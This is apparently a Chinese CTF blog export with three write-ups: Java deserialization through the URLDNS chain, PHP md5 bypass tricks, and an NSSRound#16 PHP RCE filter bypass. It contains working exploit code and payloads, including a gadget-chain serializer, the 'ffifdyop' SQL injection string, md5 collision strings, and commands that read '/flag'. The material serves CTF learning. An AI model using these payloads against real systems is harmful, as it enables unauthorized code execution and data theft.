<h1 id="java反序列化的几种攻击方式"><a href="#java反序列化的几种攻击方式" class="headerlink" title="java反序列化的几种攻击方式"></a>java反序列化的几种攻击方式</h1><h2 id="readObject下写用恶意代码"><a href="#readObject下写用恶意代码" class="headerlink" title="readObject下写用恶意代码"></a>readObject下写用恶意代码</h2><p>我们都知道了如果重写了readObject时再反序列调用时就会调用这个重写的readObject，那么如果再这个后端有这么一个类，其readObject下写有恶意代码那么是不是就可以进行攻击了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现 Serializable 接口，表示该类可以被序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="comment">//无参构造方法，在实例化对象时调用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//有参构造方法，实现赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写了 Object 类中的 toString() 方法</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name = &#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age = &quot;</span> + age + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" class="" title="alt text"><br>反序列上面的类我们可以看到其确实弹了计算机，但是这个很无趣毕竟哪里会有开发者会再一个的类下重写一个readObject的内容是恶意代码呢。有我们也不大可能知道是哪一个类。</p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>学习这个链我们先要知道一个工具就是</p>
<h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>这个工具是Gabriel Lawrence (@gebl)和ChrisFrohoff (@frohoff)这两位提出利⽤Apache Commons Collections来构造命令执⾏的利⽤链的作者写的一个开源项目它可以让⽤户根据⾃⼰选择的利⽤链，⽣成反序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令<br>而URLDNS也是这所以链子里最简单的链子。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个链子并不能进行命令执行，其只能进行一个DNS的访问，但是因为其调用的类都是java的内置类无需其他依赖，这也就导致了其可以来探测是否存在java反序列漏洞。<br>我们都知道反序列化最重要的是入口，再php中入口是<code>__destruct</code>而java就是readObject。而这条链的入口就是hashmap重写的readObject。我们先来看一下其构造的payload长什么样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://13e8d7e2-18e9-4d1b-bff3-7a6a8768d21d.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        System.out.println(hashcodefield);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        Serializ(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到payload中有HashMap这个类和URL这两个类。我们先分析HashMap<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" class="" title="alt text"><br>进入HashMap我们会发现其参数为Key和Value。因为我们主要要看的是readObject所以我们看一下这个方法<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" class="" title="alt text"><br>会发现其最后奖key传入了hash这个函数我们进入这个函数<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" class="" title="alt text"><br>我们会发现其执行了key.hashCode()。这个key的值可以为类。</p>
<p>我们再看URL<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" class="" title="alt text"><br>我们可以再URL类下找到hashCode这个方法,而这个方法下还有一个hashCode()我们步入这个方法<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" class="" title="alt text"><br>会发现其调用了getHostAddress(u);<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" class="" title="alt text"><br>再步入就会发现InetAddress.getByName(host)，这个方法的作用是根据主机名得到ip，那么肯定会有一次访问。<br>那么就会有DNS记录。而其参数host，其实就是getHostAddress的参数u也就是hashCode的参数即this。<br>我们看一下这个类的构造方法<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" class="" title="alt text"><br>可以发现当我们传入单参数是其会直接将我们传入的参数载入。那么我们只要再实例化时传入URL即可</p>
<p>即这个链子其实就如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.HashMap-&gt;readObject()</span><br><span class="line">2.HashMap-&gt;hash()-&gt;key.hashCode();</span><br><span class="line">3.URL-&gt;hashCode();</span><br><span class="line">4.URLStreamHandler-&gt;hashCode();</span><br><span class="line">5.URLStreamHandler-&gt;getHostAddress(u)</span><br><span class="line">6.InetAddress-&gt;getByName(host)</span><br></pre></td></tr></table></figure><br>可以发现这个链子很短。但是如果我们直接将URL传入hashmap如下代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://13e8d7e2-18e9-4d1b-bff3-7a6a8768d21d.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        Serializ(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>会发现其并不会如设想那样在反序列时进行请求，反而是当我们序列化时其发送了请求，而反序列时却没有进行请求。</p>
<h3 id="问题1为什么序列化时会进行请求。"><a href="#问题1为什么序列化时会进行请求。" class="headerlink" title="问题1为什么序列化时会进行请求。"></a>问题1为什么序列化时会进行请求。</h3><p>我们先来分析为什么在序列化时会发现请求<br>其主要是这个短代码的原因<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashmap.put(url,1);</span><br></pre></td></tr></table></figure><br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" class="" title="alt text"><br>我们可以发现HashMap的put这个方法也调用了hashcode这个方法这就导致其也会调用url.hashCode导致进行一次请求</p>
<h3 id="问题2-为什么反序列化时没有进行请求"><a href="#问题2-为什么反序列化时没有进行请求" class="headerlink" title="问题2 为什么反序列化时没有进行请求"></a>问题2 为什么反序列化时没有进行请求</h3><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" class="" title="alt text">
<p>我们查看URL的hashCode会发现其进行了一次判断只有当hashCode这个成员属性为-1时才会继续执行，如果不为-1那么就不会进行请求。<br>而在执行后我们会发现hashCode被赋值为handler.hashCode(this);<br>而在我们序列化执行到hashmap.put时其进行了一次请求那么hashCode的值就不为-1了<br>这就是为什么反序列时无法成功进行DNS请求</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>解决方法也很简单，我们使用之前学的反射来解决这个问题。<br>我们可以利用反射即getDeclaredField()方法来得到URL类的hashCode属性，然后利用反射来更改url实例对象的hashCode的值代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://13e8d7e2-18e9-4d1b-bff3-7a6a8768d21d.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        System.out.println(hashcodefield);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123</span>);<span class="comment">//将hashCode更改为123使得hashmap.put无法发送请求</span></span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);<span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span></span><br><span class="line">        Serializ(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png" class="" title="alt text"></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="ctfshow-web846"><a href="#ctfshow-web846" class="headerlink" title="ctfshow web846"></a>ctfshow web846</h2><p>exp<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.DoubleSummaryStatistics;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="comment">// 这里不要发起请求</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://76158ba6-2e62-456a-8da2-ee48a5f6cb58.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        System.out.println(hashcodefield);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">123</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        Serializ(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目要求我们生成一个base编码的序列化字符让其反序列化，然后DNS请求题目的网站<br>我们使用URLDNS链<br><img src="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png" class="" title="alt text"></p>
]]></content>
      <categories>
        <category>java</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>md5碰撞</title>
    <url>/2024/01/14/md5%E7%A2%B0%E6%92%9E/</url>
    <content><![CDATA[<h1 id="md5-函数介绍"><a href="#md5-函数介绍" class="headerlink" title="md5()函数介绍"></a>md5()函数介绍</h1><p>md5(str,raw)<br>str为要编码的字符串<br>raw为编码模式默认为false即32为16进制字符。如果输入为true则为原始16字符二进制格式</p>
<h1 id="md5-sql注入"><a href="#md5-sql注入" class="headerlink" title="md5()sql注入"></a>md5()sql注入</h1><p>我写过的一道题目中有如下sql查询语句<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;$user&#x27; and password=&#x27;.&quot;md($password,true)&quot;.&#x27;</span><br></pre></td></tr></table></figure><br>这时候我们给password输入<br>ffifdyop<br>该字符就会被编码为<br><code>276f722736c95d99e921722cf9ed621c</code>转为字符串为<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code><br>这时候我们可以发现or前后都有’这回将之前和之后的’闭合or’6diaid’只要开头为数字那么就相当于or上一个数字即or上一个真那么就会如果这个查询</p>
<h1 id="md5弱比较绕过"><a href="#md5弱比较绕过" class="headerlink" title="md5弱比较绕过"></a>md5弱比较绕过</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br></pre></td></tr></table></figure>
<p>因为php的弱比较所以我们可以使用编码后为0e开头的进行绕过</p>
<h1 id="md5强比较绕过"><a href="#md5强比较绕过" class="headerlink" title="md5强比较绕过"></a>md5强比较绕过</h1><p>由于md5是32位的即其是有穷的，那么就回存在原字符串不同但是md5完全相同的情况如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$s1 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br><span class="line">$s2 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br><span class="line">$s3 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br></pre></td></tr></table></figure></p>
<h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><p><code>因为md5()参数为数组时回返回false那么这时md5(num2[])===md5(num1[])这时会返回false===false这样就可以绕过</code></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>哈希</category>
      </categories>
      <tags>
        <tag>哈希</tag>
        <tag>哈希碰撞</tag>
      </tags>
  </entry>
  <entry>
    <title>nssround#16的复现</title>
    <url>/2024/01/14/nssround-16/</url>
    <content><![CDATA[<h1 id="我个人认为这两到题目是有纪录的价值的"><a href="#我个人认为这两到题目是有纪录的价值的" class="headerlink" title="我个人认为这两到题目是有纪录的价值的"></a>我个人认为这两到题目是有纪录的价值的</h1><h1 id="RCE但没完全RCE"><a href="#RCE但没完全RCE" class="headerlink" title="RCE但没完全RCE"></a>RCE但没完全RCE</h1><p>上来的md5绕过就不多讲直接讲rec<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!!!!!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br></pre></td></tr></table></figure><br>我们可以看到其将字母f，l，a，g？*都过滤了我们也就无法使用bash或者sh来绕过，也无法使用常用的方法，我查了以下wp有以下两种题解</p>
<h1 id="1-9-q-绕过"><a href="#1-9-q-绕过" class="headerlink" title="1.[9-q]绕过"></a>1.<code>[9-q]绕过</code></h1><p><code>[9-q]</code>在linux里代表了ascii在9-q之间的字符，与通配符相似我们可以使用该方法进行绕过<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=more /[9-q][9-q][9-q][9-q]</span><br><span class="line">shell=system</span><br></pre></td></tr></table></figure></p>
<h1 id="2-使用-POST绕过"><a href="#2-使用-POST绕过" class="headerlink" title="2.使用$_POST绕过"></a>2.使用$_POST绕过</h1><p>我们可以给shell传值为urldecod使shell()失效。<br>在给cmd传值system($_POST[1]);<br>最后给1传值即可由于1没有被waf过滤使用我们可以直接在1里使用cat /flag</p>
